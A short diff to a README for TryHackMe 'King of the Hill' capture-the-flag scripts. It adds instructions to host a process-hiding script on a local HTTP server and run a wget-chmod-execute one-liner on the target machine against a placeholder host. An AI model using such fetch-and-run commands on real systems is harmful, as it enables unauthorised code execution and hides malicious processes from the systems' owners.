@@ -25,7 +25,10 @@ wget https://github.com/Anlominus/TryHackMe/blob/main/King%20of%20the%20Hill/KoT
   - [ ] 2️⃣ ~ [`KoTH-Protection`](./KoTH-Protection) ~> Protecting Rank in King of The Hill
       > A script to protect your king
   - [ ] 3️⃣ ~ [`KoTh-Hidding`](./KoTh-Hidding) ~> A simple script to hide a process with mount
-
+      > ## Start local server
+      > `python3 -m http.server 80`
+      > ## in the Target Machine
+      > `wget http://yourvpnip/KoTh-Hidding && chmod +x KoTh-Hidding && ./KoTh-Hidding`
 
 
 ---
